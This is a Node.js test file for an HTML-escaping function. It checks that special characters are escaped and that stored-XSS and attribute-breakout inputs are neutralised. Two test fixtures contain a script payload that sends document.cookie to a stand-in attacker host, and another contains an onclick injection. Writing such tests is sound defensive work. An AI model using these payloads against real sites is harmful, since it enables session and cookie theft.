/**
 * Tests for HTML escaping utility
 * Run with: node --test
 */

const { test } = require('node:test');
const assert = require('node:assert');
const { escapeHtml } = require('../static/escape.js');

test('escapeHtml: normal string without special characters remains unchanged', () => {
  const input = 'Hello World';
  const result = escapeHtml(input);
  assert.strictEqual(result, 'Hello World');
});

test('escapeHtml: escapes less-than character', () => {
  const input = '<script>';
  const result = escapeHtml(input);
  assert.strictEqual(result, '&lt;script&gt;');
});

test('escapeHtml: escapes greater-than character', () => {
  const input = '>';
  const result = escapeHtml(input);
  assert.strictEqual(result, '&gt;');
});

test('escapeHtml: escapes ampersand character', () => {
  const input = 'AT&T';
  const result = escapeHtml(input);
  assert.strictEqual(result, 'AT&amp;T');
});

test('escapeHtml: escapes double quote character', () => {
  const input = 'Say "Hello"';
  const result = escapeHtml(input);
  assert.strictEqual(result, 'Say &quot;Hello&quot;');
});

test('escapeHtml: escapes single quote character', () => {
  const input = "It's working";
  const result = escapeHtml(input);
  assert.strictEqual(result, 'It&#039;s working');
});

test('escapeHtml: escapes all special characters in XSS payload', () => {
  const xssPayload = '"><script>fetch(\'//attacker/steal?c=\'+document.cookie)</script>';
  const result = escapeHtml(xssPayload);

  // Should not contain any literal < or > or unescaped quotes
  assert.strictEqual(result.includes('<'), false, 'Should not contain literal <');
  assert.strictEqual(result.includes('>'), false, 'Should not contain literal >');
  assert.strictEqual(result.includes('"'), false, 'Should not contain literal "');

  // Should contain escaped versions
  assert.strictEqual(result.includes('&lt;'), true, 'Should contain &lt;');
  assert.strictEqual(result.includes('&gt;'), true, 'Should contain &gt;');
  assert.strictEqual(result.includes('&quot;'), true, 'Should contain &quot;');
  assert.strictEqual(result.includes('&#039;'), true, 'Should contain &#039;');
});

test('escapeHtml: handles null and undefined gracefully', () => {
  assert.strictEqual(escapeHtml(null), '');
  assert.strictEqual(escapeHtml(undefined), '');
});

test('escapeHtml: handles empty string', () => {
  assert.strictEqual(escapeHtml(''), '');
});

test('escapeHtml: handles numbers', () => {
  assert.strictEqual(escapeHtml(123), '123');
  assert.strictEqual(escapeHtml(0), '0');
});

test('escapeHtml: prevents stored XSS via destination field', () => {
  // This is the actual attack vector from the security issue
  const maliciousDestination = 'evil.io"><script>fetch(\'//attacker/steal?c=\'+document.cookie)</script>';
  const escaped = escapeHtml(maliciousDestination);

  // Create mock HTML as would be rendered
  const mockHtml = `<div>${escaped}</div>`;

  // Verify the script tags are escaped and cannot execute
  assert.strictEqual(mockHtml.includes('<script>'), false, 'Script tag should be escaped');
  assert.strictEqual(mockHtml.includes('&lt;script&gt;'), true, 'Should contain escaped script tag');
});

test('escapeHtml: prevents attribute escape attacks', () => {
  // Attack vector trying to break out of HTML attribute
  const maliciousValue = '\' onclick="alert(1)" data-x=\'';
  const escaped = escapeHtml(maliciousValue);

  // Create mock HTML as would be in data attribute
  const mockHtml = `<button data-domain="${escaped}">Click</button>`;

  // Verify quotes are escaped
  assert.strictEqual(escaped.includes("'"), false, 'Single quotes should be escaped');
  assert.strictEqual(escaped.includes('"'), false, 'Double quotes should be escaped');
});

test('escapeHtml: handles unicode and special characters', () => {
  const input = 'Привет <мир> "тест"';
  const result = escapeHtml(input);
  assert.strictEqual(result, 'Привет &lt;мир&gt; &quot;тест&quot;');
});

test('escapeHtml: multiple escaping doesn\'t break (idempotent-ish check)', () => {
  const input = '<script>';
  const once = escapeHtml(input);
  const twice = escapeHtml(once);

  // First escape should work
  assert.strictEqual(once, '&lt;script&gt;');

  // Second escape should escape the ampersands
  assert.strictEqual(twice, '&amp;lt;script&amp;gt;');
});
